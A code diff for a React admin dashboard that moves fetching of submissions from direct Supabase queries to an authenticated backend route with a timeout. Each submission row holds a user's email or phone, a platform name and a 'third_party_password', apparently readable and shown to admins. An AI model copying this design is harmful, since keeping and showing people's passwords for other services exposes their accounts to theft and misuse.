@@ -120,57 +120,59 @@ export default function Admin() {
     addDebugMessage('submissions fetch started');
     console.log('Admin: fetchSubmissions started');
     try {
-      console.log('Admin: fetching connections and requests');
-      const [connectionsResponse, requestsResponse] = await Promise.all([
-        supabase
-          .from('platform_connections')
-          .select('id, platform, email, third_party_password, created_at, user_id')
-          .order('created_at', { ascending: false }),
-        supabase
-          .from('platform_connection_requests')
-          .select('id, platform, email, phone, third_party_password, created_at, status')
-          .order('created_at', { ascending: false }),
-      ]);
-
-      console.log('Admin: connections response:', { error: connectionsResponse.error, count: connectionsResponse.data?.length });
-      if (connectionsResponse.error) {
-        console.error('Admin: Error loading authenticated submissions:', connectionsResponse.error);
-      }
-      console.log('Admin: requests response:', { error: requestsResponse.error, count: requestsResponse.data?.length });
-      if (requestsResponse.error) {
-        console.error('Admin: Error loading public requests:', requestsResponse.error);
+      // Get the current session to get the token
+      const { data: { session }, error: sessionError } = await supabase.auth.getSession();
+      if (sessionError || !session) {
+        throw new Error('No active session');
       }
 
-      const connections = connectionsResponse.data || [];
-      const requests = requestsResponse.data || [];
+      const token = session.access_token;
 
-      const mergedRows = [
-        ...connections.map((row) => ({
-          id: row.id,
-          platform: row.platform,
-          contact: row.email || '-',
-          third_party_password: row.third_party_password,
-          created_at: row.created_at,
-          user_id: row.user_id,
-          status: 'authenticated',
-        })),
-        ...requests.map((row) => ({
-          id: row.id,
-          platform: row.platform,
-          contact: row.email || row.phone || '-',
-          third_party_password: row.third_party_password,
-          created_at: row.created_at,
-          user_id: null,
-          status: row.status || 'pending',
-        })),
-      ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+      console.log('Admin: fetching submissions from backend');
+      
+      // Create a timeout promise that rejects after 10 seconds
+      const timeoutPromise = new Promise((_, reject) =>
+        setTimeout(() => reject(new Error('Request timeout - backend route not responding')), 10000)
+      );
+
+      const fetchPromise = fetch('/api/admin-submissions', {
+        method: 'GET',
+        headers: {
+          'Authorization': `Bearer ${token}`,
+          'Content-Type': 'application/json',
+        },
+      });
+
+      const response = await Promise.race([fetchPromise, timeoutPromise]) as Response;
+
+      if (!response.ok) {
+        const errorBody = await response.json().catch(() => ({}));
+        throw new Error(errorBody.error || `API error: ${response.status}`);
+      }
+
+      const { data: submissions, adminEmail, isOwner } = await response.json();
+
+      console.log('Admin: submissions response:', { count: submissions?.length, adminEmail, isOwner });
+
+      const mergedRows = (submissions || []).map((row: any) => ({
+        id: row.id,
+        platform: row.platform,
+        contact: row.email || row.phone || '-',
+        third_party_password: row.third_party_password,
+        created_at: row.created_at,
+        user_id: row.user_id || null,
+        status: row.status,
+        source: row.source,
+      }));
 
       console.log('Admin: merged rows count:', mergedRows.length);
       addDebugMessage(`submissions fetch success: ${mergedRows.length} submissions`);
+      addDebugMessage(`admin status: email=${adminEmail}, isOwner=${isOwner}`);
       setRows(mergedRows);
     } catch (err) {
       console.error('Admin: Error loading admin submissions:', err);
-      addDebugMessage(`submissions fetch failed: ${err}`);
+      const errorMsg = err instanceof Error ? err.message : String(err);
+      addDebugMessage(`submissions fetch failed: ${errorMsg}`);
     } finally {
       console.log('Admin: fetchSubmissions finally, setting loading false');
       if (isMounted.current) {
